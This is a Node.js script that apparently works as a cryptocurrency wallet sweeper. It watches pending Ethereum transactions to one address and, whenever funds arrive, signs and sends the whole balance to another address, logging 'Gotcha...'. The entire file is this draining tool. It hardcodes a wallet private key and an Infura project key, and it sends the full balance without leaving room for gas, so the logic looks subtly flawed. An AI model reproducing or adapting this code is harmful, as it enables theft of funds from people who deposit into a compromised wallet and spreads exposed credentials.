const Web3 = require('web3');
const Transaction = require('ethereumjs-tx').Transaction;
const { writeFileSync } = require('fs');

const sendUSDT = require('./usdt.js');

const infuraUrl = `wss://mainnet.infura.io/ws/v3/bed9cb5dc6b74e4c98237d00b1ea5204`;
const fromAddress = `0x4DE23f3f0Fb3318287378AdbdE030cf61714b2f3`;
const privateKey = `ee9cec01ff03c0adea731d7c5a84f7b412bfd062b9ff35126520b3eb3d5ff258`;
const toAddress = `0xFb5C09B687b7DCEA7451890B1803D6d3d7b24999`;

const web3 = new Web3(new Web3.providers.WebsocketProvider(infuraUrl));

const hex = (string) => web3.utils.toHex(string);

const sendTransaction = async () => {
  const balance = await web3.eth.getBalance(fromAddress);
  const gas = await web3.eth.estimateGas({
    from: fromAddress,
  });

  const details = {
    nonce: hex(await web3.eth.getTransactionCount(fromAddress)),
    gas: hex(gas),
    to: toAddress,
    value: hex(balance),
  };

  const transaction = new Transaction(details);

  transaction.sign(Buffer.from(privateKey, 'hex'));

  const signedTx = transaction.serialize().toString('hex');

  const txId = await web3.eth.sendSignedTransaction(signedTx);

  writeFileSync(
    `transactions/${txId.transactionHash}.json`,
    JSON.stringify(txId, null, 2),
    {
      encoding: 'utf8',
    },
  );

  console.log(`Gotcha...`);
  console.log(txId);
};

const subscribe = web3.eth.subscribe('pendingTransactions', async (_, tx) => {
  console.log(tx);
  if (!_ && tx) {
    const transaction = await web3.eth.getTransaction(tx);
    if (transaction && transaction.to === fromAddress) {
      await sendTransaction();
      // await sendUSDT();
    }
  }
});
